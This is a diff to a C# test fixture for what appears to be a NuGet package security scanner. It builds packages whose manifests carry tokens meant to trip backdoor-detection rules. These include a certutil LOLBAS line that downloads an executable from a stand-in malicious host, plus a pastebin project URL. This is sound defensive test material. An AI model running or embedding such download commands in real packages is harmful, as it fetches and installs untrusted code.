@@ -158,12 +158,16 @@ public sealed class PackageFixture : IDisposable
             ("tools/small.ps1", Encoding.UTF8.GetBytes(SmallMatchingPs1)),
         ]);
 
-        // PkgNuspecMatch: nuspec-content-scan package. Its top-level *.nuspec's <description> carries a certutil
-        // LOLBAS token that trips the embedded backdoor rules — but the manifest is deliberately NOT inventoried
-        // as a script (ADR 0012). Carries a benign lib (real fixture) and NO scripts, so any ScriptFinding must be
-        // attributed to the nuspec (RelativePath == "<id>.nuspec"). Token is original, benign-but-matching.
+        // PkgNuspecMatch: nuspec-content-scan package. Its top-level *.nuspec carries a rule-matching token in a
+        // NON-PROSE element — a pastebin <projectUrl> — which is exactly the manifest signal that stays scannable
+        // after prose redaction (docs/agent/tasks/script-rule-precision.md). Its <description> still holds the
+        // certutil prose, now blanked before scanning by design, so the finding can only come from the projectUrl.
+        // The manifest is deliberately NOT inventoried as a script (ADR 0012). Carries a benign lib (real fixture)
+        // and NO scripts, so any ScriptFinding must be attributed to the nuspec (RelativePath == "<id>.nuspec").
+        // Both tokens are original, benign-but-matching.
         var pkgNuspecMatchNuspec = NupkgBuilder.NuspecXml(
-            PkgNuspecMatchId, PkgNuspecMatchVersion, "Silvergun Tests", NuspecMatchDescription, "netstandard2.0", []);
+            PkgNuspecMatchId, PkgNuspecMatchVersion, "Silvergun Tests", NuspecMatchDescription, "netstandard2.0", [],
+            projectUrl: NuspecMatchProjectUrl);
         PkgNuspecMatchPath = Path.Combine(rootDir, $"{PkgNuspecMatchId}.{PkgNuspecMatchVersion}.nupkg");
         NuspecMatchFileName = $"{PkgNuspecMatchId}.nuspec";
         NupkgBuilder.WriteNupkg(PkgNuspecMatchPath,
@@ -263,11 +267,20 @@ public sealed class PackageFixture : IDisposable
     public const string PkgNuspecSlipVersion = "11.12.13";
 
     /// <summary>
-    /// Description embedded in the nuspec-content-scan packages: prose plus a certutil LOLBAS line that trips the
-    /// embedded backdoor rules (the rule requires the token to be whitespace-delimited). Original, benign-but-matching.
+    /// Description embedded in the nuspec-content-scan packages: prose plus a certutil LOLBAS line. <c>&lt;description&gt;</c>
+    /// is PROSE, so its character content is blanked before the manifest is rule-scanned
+    /// (<c>docs/agent/tasks/script-rule-precision.md</c>) — this token therefore no longer produces a finding, by design.
+    /// It is retained so the fixture still proves redaction does not disturb the surrounding, scannable manifest.
     /// </summary>
     public const string NuspecMatchDescription =
         "This package scans local files during install. certutil -urlcache -f http://malicious.example/n.exe";
+
+    /// <summary>
+    /// PkgNuspecMatch's <c>&lt;projectUrl&gt;</c>: a pastebin URL that trips the embedded backdoor rules (BD000500).
+    /// <c>projectUrl</c> is NON-prose, so it survives redaction fully scannable — the genuine nuspec signal per
+    /// <c>docs/agent/tasks/script-rule-precision.md</c>. Original, benign-but-matching (the host is never contacted).
+    /// </summary>
+    public const string NuspecMatchProjectUrl = "https://pastebin.com/raw/silvergun-nuspec-test";
 
     /// <summary>
     /// PkgScript's install.ps1: a PowerShell IEX-download reverse-shell line plus a certutil LOLBAS line —
